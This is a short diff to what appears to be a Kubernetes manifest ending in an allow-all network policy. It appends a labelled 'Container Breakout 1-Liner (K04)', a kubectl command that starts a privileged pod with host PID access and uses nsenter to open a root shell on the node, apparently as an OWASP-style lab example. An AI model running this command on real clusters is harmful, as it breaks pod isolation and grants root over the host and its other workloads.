@@ -87,3 +87,12 @@ spec:
     - {}
   egress:
     - {}
+
+# Container Breakout 1-Liner (K04)
+kubectl run r00t --restart=Never -ti --rm --image lol \
+  --overrides '{"spec":{"hostPID": true, 
+  "containers":[{"name":"1","image":"alpine", 
+  "command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"], 
+  "stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent", 
+  "securityContext":{"privileged":true}}]}}' \
+  --quiet
